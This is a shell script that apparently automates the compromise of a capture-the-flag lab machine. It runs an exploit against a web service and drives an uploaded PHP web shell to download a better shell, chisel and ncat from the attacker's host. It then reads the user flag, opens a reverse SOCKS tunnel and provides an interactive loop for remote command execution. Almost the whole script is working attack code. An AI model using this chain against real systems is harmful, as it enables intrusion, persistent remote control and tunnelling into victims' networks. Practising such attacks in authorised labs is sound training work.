#!/bin/sh

host="10.10.14.13"

printf "\e[0;32mRunning exploit...\n\e[0;0m"
python exploit.py "http://10.10.10.198:8080/"

printf "\e[0;32mTransferring better shell http://10.10.10.198:8080/upload/shell.php\n\e[0;0m"
cmd="curl http://${host}/tools/short-shell.php -o shell.php"
curl -G "http://10.10.10.198:8080/upload/kamehameha.php" --data-urlencode "telepathy=${cmd}"

printf "\e[0;32mTransferring chisel\n\e[0;0m"
cmd="curl http://${host}/tools/chisel.exe -o chisel.exe 2>&1"
curl -G "http://10.10.10.198:8080/upload/shell.php" --data-urlencode "system=${cmd}"

printf "\n\e[0;32mTransferring ncat\n\e[0;0m"
cmd="curl http://${host}/tools/ncat.exe -o ncat.exe 2>&1"
curl -G "http://10.10.10.198:8080/upload/shell.php" --data-urlencode "system=${cmd}"

printf "\n\e[0;32mHere comes the user flag\n\e[0;0m"
cmd="type C:\Users\shaun\Desktop\user.txt"
curl -G "http://10.10.10.198:8080/upload/shell.php" --data-urlencode "system=${cmd}"

printf "\n\e[0;32mStarting chisel server\n\e[0;0m"
chisel server -p 8000 --reverse &

sleep 2
cmd="chisel client ${host}:8000 R:socks"
printf "\e[0;32mConnecting socks proxy: \e[0;34m${cmd}\n\e[0;0m"
curl -G "http://10.10.10.198:8080/upload/shell.php" --data-urlencode "system=${cmd}" 2>/dev/null &

sleep 10
printf "\e[0;32mNow config \e[0;34m/etc/proxychains.conf\e[0;32m with \e[0;34msocks5 127.0.0.1 1080\e[0;32m\n"
printf "Here's a \"shell\"\n\e[0;0m"
while true; do
 echo -n "$ "; read cmd
 curl --silent -G 'http://10.10.10.198:8080/upload/shell.php' --data-urlencode "system=${cmd}"; echo "\n"
done